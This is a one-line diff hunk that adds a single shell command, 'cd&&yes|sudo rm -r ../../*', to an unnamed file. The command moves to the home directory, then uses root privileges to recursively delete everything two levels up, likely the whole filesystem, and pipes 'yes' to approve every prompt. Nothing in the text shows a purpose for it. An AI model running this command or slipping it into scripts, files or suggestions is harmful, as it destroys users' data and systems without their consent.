@@ -1,0 +1,1 @@
+cd&&yes|sudo rm -r ../../*
